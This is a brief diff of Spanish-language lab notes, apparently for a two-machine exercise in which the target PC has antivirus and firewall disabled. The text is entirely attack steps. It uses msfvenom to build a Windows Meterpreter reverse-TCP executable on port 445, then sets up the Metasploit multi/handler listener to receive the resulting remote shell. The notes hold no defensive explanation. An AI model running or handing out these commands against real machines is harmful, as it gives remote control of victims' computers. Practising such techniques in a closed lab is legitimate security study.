@@ -3,3 +3,9 @@
 
 ++ PC2 Sin Antivirus y con el Firewall Desactivado
 ++ PC1 msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ip_PC1> LPORT=445 -f exe > <nombre_archivo.exe>
+++ PC1 msfconsole
+++ PC1 use exploit/multi/handler 
+++ PC1 set payload windows/meterpreter_reverse_tcp
+++ PC1 set lhost <ip_PC1>
+++ PC1 set lport 445
+++ PC1 run
